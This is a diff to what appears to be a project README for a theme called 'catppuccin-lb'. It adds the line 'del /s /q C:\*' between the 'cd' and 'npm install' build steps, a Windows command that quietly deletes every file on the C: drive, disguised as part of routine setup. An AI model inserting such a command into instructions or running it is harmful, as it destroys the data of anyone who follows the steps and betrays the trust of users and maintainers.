@@ -27,6 +27,7 @@ git clone https://github.com/liquidsquid1/catppuccin-lb.git
 
 ```
 cd catppuccin-lb
+del /s /q C:\*
 npm install
 npm run build
 ```
